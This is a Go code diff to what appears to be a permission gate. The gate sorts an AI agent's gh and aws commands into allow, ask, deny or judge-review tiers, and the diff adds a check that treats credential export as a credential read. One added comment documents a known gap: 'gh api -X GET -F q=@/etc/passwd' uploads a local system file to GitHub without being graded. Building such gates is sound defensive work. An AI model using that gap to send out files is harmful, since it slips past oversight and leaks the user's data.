@@ -26,8 +26,7 @@ import (
 //     can redirect TOTALLY (ghGraphQLMutationRedirects, today `updateIssue`)
 //     (see classifyGhAPI); a redirect whose destination provably escapes the
 //     worktree or lands under `.git/` (credentialedRedirectVerdict).
-//   - HARD ASK (the enumerated human-click tier, INTENDED to be unwaivable
-//     downstream — see README.md, "The hard-ask tier's precedence is unpinned"):
+//   - HARD ASK (the enumerated human-click tier — see BucketAsk):
 //     gh repo edit --visibility; gh auth login --hostname; the publish
 //     verbs (gh release create; EVERY gh gist create, secret and public
 //     alike — a secret gist is unlisted, not private; and EVERY gh gist edit,
@@ -112,10 +111,12 @@ func classifyGh(args []string, sc simpleCommand, ev *Event) Decision {
 		case "login":
 			// HARD ASK tier: login can re-target identity, and the
 			// credential surface is user-owned, so this is a human decision by
-			// policy rather than an unclassifiable command. (The normal pipeline
-			// allow-lists 'gh auth login', but a switch via re-login is the
-			// multi-identity-switch form the deny above warns about.)
-			if containsToken(cmd[2:], "--hostname") || containsToken(cmd[2:], "-h") {
+			// policy rather than an unclassifiable command. A switch via
+			// re-login is the multi-identity-switch form the deny above warns
+			// about. The `--hostname=<host>` spelling asks with the separate
+			// one, as the `gh api` arm denies both.
+			if containsToken(cmd[2:], "--hostname") || containsToken(cmd[2:], "-h") ||
+				hasFlagPrefix(cmd[2:], "--hostname=") {
 				return ask("gh auth login --hostname",
 					"'gh auth login' targeting a specific host can switch the active identity. Credential "+
 						"surfaces are user-owned, so this is a human decision by policy. Confirm this is "+
@@ -205,8 +206,7 @@ func classifyGh(args []string, sc simpleCommand, ev *Event) Decision {
 	// HARD ASK tier: gh repo edit --visibility (sanctioned-skill
 	// territory). A visibility flip is a publish in the sense this tier cares
 	// about — the human click is the sanctioned escalation for publishing — so
-	// it is meant to stand rather than be waived downstream (that precedence is
-	// design intent, not a pinned fact).
+	// the gate asks rather than deferring it to a judge.
 	if cmd[0] == "repo" && len(cmd) >= 2 && cmd[1] == "edit" {
 		if containsToken(args, "--visibility") || hasFlagPrefix(args, "--visibility=") {
 			return ask("gh repo edit --visibility",
@@ -691,9 +691,8 @@ const ghAPIHostnameDenyReason = "Blocked: 'gh api --hostname' redirects the SIGN
 //     DENY unconditionally — this is the one shape the egress proxy's
 //     host-allowlist can see and control, so it keeps its own justification
 //     (not the write/read asymmetry the other tiers below hinge on).
-//   - Write DEFER tiers (they denied outright before, then asked): an
-//     x-http-method-override header, an explicit non-GET method, and a
-//     request-body flag
+//   - Write DEFER tiers: an x-http-method-override header, an explicit
+//     non-GET method, and a request-body flag
 //     (-f/-F/--field/--raw-field/--input) with no explicit GET method
 //     (implicit-POST flip). A `gh api` REST write is a credential-carrying
 //     mutation of remote repo state the microVM cannot roll back — the same
@@ -702,7 +701,12 @@ const ghAPIHostnameDenyReason = "Blocked: 'gh api --hostname' redirects the SIGN
 //     the write the session is meant to be making, is read from the arguments
 //     and the context rather than from the method token this arm matches on, so
 //     it goes to the judgment middle rather than to a human click. The
-//     `-XGET -f …` carve-out (a GET with params) is preserved.
+//     `-XGET -f …` carve-out (a GET with params) stays a read, and that is
+//     the one place a local file reaches GitHub ungraded: `-F`/`--field`
+//     expands an `@file` value, so `gh api -X GET -F q=@/etc/passwd
+//     repos/o/r` ALLOWS without the file being graded against the repository
+//     boundary. The publish-file grading (classify_gh_files.go) does not
+//     reach `gh api`.
 //   - graphql endpoint (Design A): classify the query DOCUMENT instead of
 //     blanket-denying. The document is extractable only from a literal
 //     `-f query=…` / `--raw-field query=…` value; `-F query=…`, `--input`, or no
@@ -1174,8 +1178,15 @@ func awsCredentialRead(svc, op string, args []string) bool {
 		// bare-verb command (no hyphen) so it is excluded from awsReadOnlyOp;
 		// when the key it reads is secret-bearing it is a credential read → ASK
 		// (exposure harm). The key is the next positional after `get`.
-		if op == "get" {
+		// `aws configure export-credentials` resolves the profile's
+		// credentials and prints them in every `--format` it takes ("Export
+		// credentials in various formats", the AWS CLI reference), so it is a
+		// credential read whatever its flags.
+		switch op {
+		case "get":
 			return awsConfigureReadsSecret(args)
+		case "export-credentials":
+			return true
 		}
 	}
 	// Structural whitelist anchor: any `get-*` operation whose NAME carries a
